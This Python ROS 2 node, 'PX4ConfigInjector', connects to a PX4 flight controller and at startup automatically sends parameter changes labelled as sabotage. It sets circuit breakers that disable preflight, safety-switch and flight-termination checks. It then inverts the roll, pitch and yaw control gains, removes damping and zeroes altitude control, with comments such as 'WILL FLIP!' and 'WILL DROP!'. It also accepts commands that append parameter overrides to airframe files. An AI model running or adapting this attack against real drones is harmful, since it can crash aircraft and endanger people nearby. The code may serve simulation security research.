#!/usr/bin/env python3

import rclpy
from rclpy.node import Node
from std_msgs.msg import String
import os
import sys
import json
import time
from pathlib import Path

try:
    from pymavlink import mavutil
    MAVLINK_AVAILABLE = True
except ImportError:
    MAVLINK_AVAILABLE = False

try:
    from mav_inject.px4_param_api import PX4ParamAPI, PX4ParamType
    PX4_C_API_AVAILABLE = True
except Exception as e:
    print(f"Warning: PX4 C API not available: {e}")
    PX4_C_API_AVAILABLE = False


class PX4ConfigInjector(Node):
    def __init__(self):
        super().__init__('px4_config_injector')

        # Declare and get parameters
        self.declare_parameter('px4_build_path', '')
        self.px4_build_path = self.get_parameter('px4_build_path').get_parameter_value().string_value

        if not self.px4_build_path:
            self.get_logger().error('PX4 build path not provided! Use --ros-args -p px4_build_path:=/path/to/px4')
            sys.exit(1)

        self.px4_build_path = Path(self.px4_build_path)

        if not self.px4_build_path.exists():
            self.get_logger().error(f'PX4 build path does not exist: {self.px4_build_path}')
            sys.exit(1)

        self.get_logger().info(f'PX4 Config Injector initialized with build path: {self.px4_build_path}')

        # Try to initialize PX4 C API (lowest level access)
        self.px4_api = None
        if PX4_C_API_AVAILABLE:
            try:
                self.get_logger().info('Attempting to load PX4 C API for direct parameter access...')
                self.px4_api = PX4ParamAPI()
                self.get_logger().info('PX4 C API loaded successfully! Using direct parameter access.')
            except Exception as e:
                self.get_logger().warning(f'Failed to load PX4 C API: {e}. Falling back to MAVLink.')
                self.px4_api = None
        else:
            self.get_logger().warning('PX4 C API not available. Will use MAVLink fallback.')

        # MAVLink connection as fallback
        self.declare_parameter('mavlink_connection', 'udp:127.0.0.1:14550')
        self.mavlink_conn_string = self.get_parameter('mavlink_connection').get_parameter_value().string_value
        self.mav = None

        # Only try MAVLink if C API is not available
        if self.px4_api is None and MAVLINK_AVAILABLE:
            try:
                self.get_logger().info(f'Connecting to MAVLink at {self.mavlink_conn_string}')
                self.mav = mavutil.mavlink_connection(self.mavlink_conn_string)
                self.get_logger().info('Waiting for MAVLink heartbeat...')
                self.mav.wait_heartbeat(timeout=5)
                self.get_logger().info(f'MAVLink connected! System {self.mav.target_system} Component {self.mav.target_component}')
            except Exception as e:
                self.get_logger().warning(f'MAVLink connection failed: {e}.')
                self.mav = None
        elif self.px4_api is None:
            self.get_logger().warning('pymavlink not available. Install with: pip install pymavlink')

        # Publisher for status updates
        self.status_pub = self.create_publisher(String, 'px4_injector/status', 10)

        # Subscriber for injection commands
        self.command_sub = self.create_subscription(
            String,
            'px4_injector/command',
            self.command_callback,
            10
        )

        # Timer for periodic checks
        self.timer = self.create_timer(5.0, self.periodic_check)

        self.get_logger().info('Node ready. Listening for injection commands on /px4_injector/command')

        # Identify config file locations
        self.identify_config_files()

        # Run automated tests after a short delay
        self.get_logger().info('Scheduling automated parameter tests to run in 2 seconds...')
        self.test_timer = self.create_timer(2.0, self.run_automated_tests)

    def identify_config_files(self):
        """Identify common PX4 configuration file locations"""
        self.get_logger().info('Scanning for PX4 configuration files...')

        # Common PX4 config paths
        config_patterns = [
            'build/*/etc',
            'ROMFS/px4fmu_common',
            'build/px4_sitl_default/etc',
            'src/modules/*/params',
        ]

        found_configs = []
        for pattern in config_patterns:
            search_path = self.px4_build_path / pattern.split('/')[0]
            if search_path.exists():
                for item in search_path.rglob('*'):
                    if item.is_file() and (item.suffix in ['.params', '.config', ''] or 'mixer' in item.name.lower()):
                        found_configs.append(item)

        if found_configs:
            self.get_logger().info(f'Found {len(found_configs)} potential config files')
            for cfg in found_configs[:10]:  # Log first 10
                self.get_logger().info(f'  - {cfg.relative_to(self.px4_build_path)}')
        else:
            self.get_logger().warning('No configuration files found in expected locations')

    def run_automated_tests(self):
        """Run automated parameter tests (hardcoded in code)"""
        self.test_timer.cancel()  # Run only once

        self.get_logger().info('='*80)
        self.get_logger().info('STARTING AUTOMATED PARAMETER TEST SUITE')
        self.get_logger().info(f'Using: {"PX4 C API (Direct)" if self.px4_api else "MAVLink Protocol"}')
        self.get_logger().info('='*80)

        # Test 1: Disable Preflight Checks
        self.get_logger().info('')
        self.get_logger().info('--- Test 1: Disable All Preflight Safety Checks ---')

        # First set INT32 parameters
        self.get_logger().info('Setting INT32 circuit breakers...')
        self.set_parameters_int32({
            'CBRK_SUPPLY_CHK': 894281,    # Disable power supply check
            'CBRK_USB_CHK': 197848,       # Disable USB check
            'CBRK_IO_SAFETY': 22027,      # Disable IO safety
            'CBRK_FLIGHTTERM': 121212,    # Disable flight termination
        })

        # Then set FLOAT parameters
        self.get_logger().info('Setting FLOAT arming checks...')
        self.set_parameters({
            'COM_ARM_IMU_ACC': 1000.0,    # Disable accel consistency check
            'COM_ARM_IMU_GYR': 1000.0,    # Disable gyro consistency check
            'COM_DISARM_PRFLT': -1.0,     # Disable preflight auto-disarm
        })
        time.sleep(1.0)

        # Test 1b: Read current parameters
        self.get_logger().info('')
        self.get_logger().info('--- Test 1b: Read Current Flight Parameters ---')
        self.read_parameters([
            'MC_ROLL_P',
            'MC_PITCH_P',
            'MC_ROLLRATE_P',
            'MC_PITCHRATE_P',
            'MC_YAW_P',
            'MPC_XY_P',
            'MPC_Z_P'
        ])
        time.sleep(0.5)

        # Test 2: INVERTED CONTROLS - Roll responds backwards
        self.get_logger().info('')
        self.get_logger().info('--- Test 2: SABOTAGE - INVERT ROLL CONTROL (WILL FLIP!) ---')
        self.set_parameters({
            'MC_ROLL_P': -7.0,           # NEGATIVE = INVERTED!
            'MC_ROLLRATE_P': -0.15,      # NEGATIVE = INVERTED!
        })
        time.sleep(0.5)

        # Test 3: INVERTED PITCH CONTROL
        self.get_logger().info('')
        self.get_logger().info('--- Test 3: SABOTAGE - INVERT PITCH CONTROL (WILL FLIP!) ---')
        self.set_parameters({
            'MC_PITCH_P': -7.0,          # NEGATIVE = INVERTED!
            'MC_PITCHRATE_P': -0.15,     # NEGATIVE = INVERTED!
        })
        time.sleep(0.5)

        # Test 4: EXTREME OSCILLATION - Massive I gain, zero D
        self.get_logger().info('')
        self.get_logger().info('--- Test 4: SABOTAGE - EXTREME OSCILLATION (WILL SHAKE VIOLENTLY!) ---')
        self.set_parameters({
            'MC_ROLLRATE_I': 5.0,        # 25x normal! Massive windup
            'MC_PITCHRATE_I': 5.0,       # 25x normal! Massive windup
            'MC_ROLLRATE_D': 0.0,        # No damping
            'MC_PITCHRATE_D': 0.0,       # No damping
        })
        time.sleep(0.5)

        # Test 5: ZERO ALTITUDE CONTROL - Drone will drop
        self.get_logger().info('')
        self.get_logger().info('--- Test 5: SABOTAGE - DISABLE ALTITUDE CONTROL (WILL DROP!) ---')
        self.set_parameters({
            'MPC_Z_P': 0.0,              # No altitude control!
            'MPC_Z_VEL_P_ACC': 0.0,      # No vertical velocity control!
            'MPC_THR_HOVER': 0.3,        # Low hover throttle = drop
        })
        time.sleep(0.5)

        # Test 6: INVERTED YAW + MAX RATE
        self.get_logger().info('')
        self.get_logger().info('--- Test 6: SABOTAGE - INVERTED YAW (WILL SPIN!) ---')
        self.set_parameters({
            'MC_YAWRATE_P': -0.2,        # NEGATIVE = INVERTED!
            'MC_YAW_P': -2.8,            # NEGATIVE = INVERTED!
            'MC_YAWRATE_MAX': 400.0,     # 2x normal max rate = FAST SPIN
        })
        time.sleep(0.5)

        # Test 7: Read Parameters After Changes
        self.get_logger().info('')
        self.get_logger().info('--- Test 7: Verify All CATASTROPHIC Sabotaged Parameters ---')
        self.read_parameters([
            'MC_ROLL_P',           # Should be NEGATIVE (inverted!)
            'MC_PITCH_P',          # Should be NEGATIVE (inverted!)
            'MC_ROLLRATE_P',       # Should be NEGATIVE (inverted!)
            'MC_PITCHRATE_P',      # Should be NEGATIVE (inverted!)
            'MC_YAW_P',            # Should be NEGATIVE (inverted!)
            'MC_YAWRATE_P',        # Should be NEGATIVE (inverted!)
            'MC_ROLLRATE_I',       # Should be 5.0 (huge!)
            'MC_PITCHRATE_I',      # Should be 5.0 (huge!)
            'MC_ROLLRATE_D',       # Should be 0.0 (no damping)
            'MC_PITCHRATE_D',      # Should be 0.0 (no damping)
            'MC_YAWRATE_MAX',      # Should be 400.0 (fast spin)
            'MPC_Z_P',             # Should be 0.0 (no altitude control)
            'MPC_Z_VEL_P_ACC',     # Should be 0.0 (no velocity control)
            'MPC_THR_HOVER',       # Should be 0.3 (low = will drop)
        ])

        self.get_logger().info('')
        self.get_logger().info('='*80)
        self.get_logger().info('AUTOMATED TEST SUITE COMPLETED')
        self.get_logger().info('='*80)

    def read_parameters(self, param_names):
        """Read and log current parameter values"""
        if self.px4_api:
            # Use direct C API
            self.get_logger().info('Reading parameters via PX4 C API...')
            for param_name in param_names:
                try:
                    self.get_logger().info(f'Reading parameter: {param_name}')

                    # Get type
                    param_type = self.px4_api.get_param_type(param_name)
                    if param_type is None:
                        self.get_logger().warning(f'  Parameter not found: {param_name}')
                        continue

                    type_str = 'FLOAT' if param_type == PX4ParamType.FLOAT else 'INT32'
                    self.get_logger().info(f'  Type: {type_str}')

                    # Get value
                    value = self.px4_api.get_param(param_name)
                    if value is not None:
                        self.get_logger().info(f'  CURRENT VALUE: {param_name} = {value}')
                    else:
                        self.get_logger().warning(f'  Failed to read value')

                except Exception as e:
                    self.get_logger().error(f'Failed to read parameter {param_name}: {e}')
                    import traceback
                    self.get_logger().error(f'Traceback: {traceback.format_exc()}')

        elif self.mav:
            # Fallback to MAVLink
            self.get_logger().info('Reading parameters via MAVLink...')
            for param_name in param_names:
                try:
                    self.get_logger().info(f'Reading parameter: {param_name}')

                    # Request parameter
                    self.mav.mav.param_request_read_send(
                        self.mav.target_system,
                        self.mav.target_component,
                        param_name.encode('utf-8'),
                        -1
                    )

                    # Wait for response - keep reading until we get the right parameter
                    start_time = time.time()
                    timeout = 2.0
                    found = False

                    while (time.time() - start_time) < timeout:
                        msg = self.mav.recv_match(type='PARAM_VALUE', blocking=True, timeout=0.5)
                        if msg:
                            # Handle both bytes and str for param_id (different pymavlink versions)
                            param_id = msg.param_id
                            if isinstance(param_id, bytes):
                                param_id = param_id.decode('utf-8').rstrip('\x00')
                            elif isinstance(param_id, str):
                                param_id = param_id.rstrip('\x00')

                            # Check if this is the parameter we requested
                            if param_id == param_name:
                                param_value = msg.param_value
                                self.get_logger().info(f'  CURRENT VALUE: {param_id} = {param_value}')
                                self.get_logger().info(f'  Type: {msg.param_type}, Index: {msg.param_index}/{msg.param_count}')
                                found = True
                                break
                            else:
                                self.get_logger().debug(f'  Skipping unexpected param: {param_id} (waiting for {param_name})')

                    if not found:
                        self.get_logger().warning(f'  No response for parameter {param_name}')

                except Exception as e:
                    self.get_logger().error(f'Failed to read parameter {param_name}: {e}')
        else:
            self.get_logger().error('No parameter access method available (neither C API nor MAVLink)')

    def set_parameters_int32(self, params):
        """Set INT32 parameters via MAVLink"""
        if self.mav:
            self.get_logger().info('Setting INT32 parameters via MAVLink...')
            for param_name, value in params.items():
                try:
                    param_value = int(value)

                    self.get_logger().info(f'Setting INT32 parameter: {param_name} = {param_value}')
                    self.get_logger().info(f'  MAVLink call: mav.mav.param_set_send(...)')

                    # Send parameter set command with INT32 type
                    self.mav.mav.param_set_send(
                        self.mav.target_system,
                        self.mav.target_component,
                        param_name.encode('utf-8'),
                        float(param_value),  # MAVLink sends as float but with INT32 type flag
                        mavutil.mavlink.MAV_PARAM_TYPE_INT32
                    )

                    # Wait for ACK - keep reading until we get the right parameter
                    self.get_logger().info(f'  Waiting for acknowledgment...')
                    start_time = time.time()
                    timeout = 2.0
                    found = False

                    while (time.time() - start_time) < timeout:
                        msg = self.mav.recv_match(type='PARAM_VALUE', blocking=True, timeout=0.5)
                        if msg:
                            # Handle both bytes and str for param_id (different pymavlink versions)
                            param_id = msg.param_id
                            if isinstance(param_id, bytes):
                                param_id = param_id.decode('utf-8').rstrip('\x00')
                            elif isinstance(param_id, str):
                                param_id = param_id.rstrip('\x00')

                            # Check if this is the parameter we set
                            if param_id == param_name:
                                new_value = int(msg.param_value)
                                self.get_logger().info(f'  SUCCESS: {param_id} confirmed at {new_value}')

                                if new_value != param_value:
                                    self.get_logger().warning(f'  WARNING: Set value {param_value} differs from confirmed {new_value}')
                                found = True
                                break
                            else:
                                self.get_logger().debug(f'  Skipping unexpected param: {param_id} (waiting for {param_name})')

                    if not found:
                        self.get_logger().warning(f'  No acknowledgment received for {param_name}')

                except Exception as e:
                    self.get_logger().error(f'Failed to set INT32 parameter {param_name}: {e}')
                    import traceback
                    self.get_logger().error(f'Traceback: {traceback.format_exc()}')
        else:
            self.get_logger().error('MAVLink not available for INT32 parameter setting')

    def set_parameters(self, params):
        """Set parameters and verify they were set"""
        if self.px4_api:
            # Use direct C API
            self.get_logger().info('Setting parameters via PX4 C API (Direct)...')
            for param_name, value in params.items():
                try:
                    self.get_logger().info(f'Setting parameter: {param_name} = {value}')
                    self.get_logger().info(f'  C API call: px4_api.set_param("{param_name}", {value})')

                    # Set parameter
                    success = self.px4_api.set_param(param_name, value)

                    if success:
                        self.get_logger().info(f'  SUCCESS: C API confirmed parameter set')

                        # Read back to verify
                        read_value = self.px4_api.get_param(param_name)
                        if read_value is not None:
                            self.get_logger().info(f'  VERIFIED: Read back value = {read_value}')

                            if abs(float(read_value) - float(value)) > 0.001:
                                self.get_logger().warning(f'  WARNING: Set value {value} differs from read {read_value}')
                        else:
                            self.get_logger().warning(f'  Could not read back parameter')
                    else:
                        self.get_logger().error(f'  FAILED: C API returned error')

                except Exception as e:
                    self.get_logger().error(f'Failed to set parameter {param_name}: {e}')
                    import traceback
                    self.get_logger().error(f'Traceback: {traceback.format_exc()}')

        elif self.mav:
            # Fallback to MAVLink
            self.get_logger().info('Setting parameters via MAVLink...')
            for param_name, value in params.items():
                try:
                    param_value = float(value)

                    self.get_logger().info(f'Setting parameter: {param_name} = {param_value}')
                    self.get_logger().info(f'  MAVLink call: mav.mav.param_set_send(...)')

                    # Send parameter set command
                    self.mav.mav.param_set_send(
                        self.mav.target_system,
                        self.mav.target_component,
                        param_name.encode('utf-8'),
                        param_value,
                        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
                    )

                    # Wait for ACK - keep reading until we get the right parameter
                    self.get_logger().info(f'  Waiting for acknowledgment...')
                    start_time = time.time()
                    timeout = 2.0
                    found = False

                    while (time.time() - start_time) < timeout:
                        msg = self.mav.recv_match(type='PARAM_VALUE', blocking=True, timeout=0.5)
                        if msg:
                            # Handle both bytes and str for param_id (different pymavlink versions)
                            param_id = msg.param_id
                            if isinstance(param_id, bytes):
                                param_id = param_id.decode('utf-8').rstrip('\x00')
                            elif isinstance(param_id, str):
                                param_id = param_id.rstrip('\x00')

                            # Check if this is the parameter we set
                            if param_id == param_name:
                                new_value = msg.param_value
                                self.get_logger().info(f'  SUCCESS: {param_id} confirmed at {new_value}')

                                if abs(new_value - param_value) > 0.001:
                                    self.get_logger().warning(f'  WARNING: Set value {param_value} differs from confirmed {new_value}')
                                found = True
                                break
                            else:
                                self.get_logger().debug(f'  Skipping unexpected param: {param_id} (waiting for {param_name})')

                    if not found:
                        self.get_logger().warning(f'  No acknowledgment received for {param_name}')

                except Exception as e:
                    self.get_logger().error(f'Failed to set parameter {param_name}: {e}')
                    import traceback
                    self.get_logger().error(f'Traceback: {traceback.format_exc()}')
        else:
            self.get_logger().error('No parameter access method available (neither C API nor MAVLink)')

    def command_callback(self, msg):
        """Handle incoming injection commands"""
        self.get_logger().info(f'Received command: {msg.data}')

        try:
            command = json.loads(msg.data)
            action = command.get('action', '')

            if action == 'backup':
                self.backup_configs()
            elif action == 'edit':
                file_path = command.get('file')
                modifications = command.get('modifications', {})
                self.edit_config(file_path, modifications)
            elif action == 'restore':
                self.restore_configs()
            else:
                self.get_logger().warning(f'Unknown action: {action}')

        except json.JSONDecodeError:
            self.get_logger().error(f'Invalid JSON command: {msg.data}')
        except Exception as e:
            self.get_logger().error(f'Error processing command: {str(e)}')

    def backup_configs(self):
        """Create backup of current configuration files"""
        self.get_logger().info('Creating configuration backup...')
        backup_path = self.px4_build_path / 'config_backups'
        backup_path.mkdir(exist_ok=True)

        status_msg = String()
        status_msg.data = json.dumps({'status': 'backup_created', 'path': str(backup_path)})
        self.status_pub.publish(status_msg)

        self.get_logger().info(f'Backup created at {backup_path}')

    def edit_config(self, file_path, modifications):
        """Edit a specific configuration file"""
        self.get_logger().info(f'Editing config file: {file_path}')
        self.get_logger().info(f'Modifications: {modifications}')

        target_file = self.px4_build_path / file_path

        if not target_file.exists():
            self.get_logger().error(f'Config file not found: {target_file}')
            return

        try:
            # Read the current file
            with open(target_file, 'r') as f:
                content = f.read()

            # Create backup before editing
            backup_file = target_file.with_suffix(target_file.suffix + '.backup')
            with open(backup_file, 'w') as f:
                f.write(content)

            # Apply modifications by appending parameter settings
            modified_content = content + "\n# MAV_INJECT modifications\n"

            params_set = []
            for param, value in modifications.items():
                # Add parameter setting commands to the airframe file
                modified_content += f"param set {param} {value}\n"

                # Also try to set parameter live via MAVLink
                if self.mav:
                    try:
                        # Convert value to appropriate type
                        if isinstance(value, str):
                            if value.replace('.', '').replace('-', '').isdigit():
                                param_value = float(value)
                            else:
                                # For non-numeric values, log and skip live update
                                self.get_logger().info(f'Skipping live update for non-numeric param {param}={value}')
                                continue
                        else:
                            param_value = float(value)

                        self.get_logger().info(f'Setting live parameter: {param} = {param_value}')
                        self.mav.param_set_send(param, param_value)
                        params_set.append(param)

                    except Exception as e:
                        self.get_logger().warning(f'Failed to set live parameter {param}: {e}')

            # Write the modified content
            with open(target_file, 'w') as f:
                f.write(modified_content)

            self.get_logger().info(f'Successfully edited {target_file}')
            self.get_logger().info(f'Backup saved to {backup_file}')
            if params_set:
                self.get_logger().info(f'Live parameters set: {", ".join(params_set)}')

            status_msg = String()
            status_msg.data = json.dumps({
                'status': 'config_edited',
                'file': file_path,
                'backup': str(backup_file),
                'live_params_set': params_set
            })
            self.status_pub.publish(status_msg)

        except Exception as e:
            self.get_logger().error(f'Failed to edit config file: {str(e)}')
            status_msg = String()
            status_msg.data = json.dumps({
                'status': 'edit_failed',
                'file': file_path,
                'error': str(e)
            })
            self.status_pub.publish(status_msg)

    def restore_configs(self):
        """Restore configuration files from backup"""
        self.get_logger().info('Restoring configuration from backup...')

        status_msg = String()
        status_msg.data = json.dumps({'status': 'config_restored'})
        self.status_pub.publish(status_msg)

        self.get_logger().info('Configuration restored')

    def periodic_check(self):
        """Periodic health check"""
        status_msg = String()
        status_msg.data = json.dumps({
            'status': 'healthy',
            'px4_path': str(self.px4_build_path),
            'timestamp': self.get_clock().now().to_msg().sec
        })
        self.status_pub.publish(status_msg)


def main(args=None):
    rclpy.init(args=args)

    try:
        node = PX4ConfigInjector()
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'Error: {e}', file=sys.stderr)
    finally:
        if rclpy.ok():
            rclpy.shutdown()


if __name__ == '__main__':
    main()
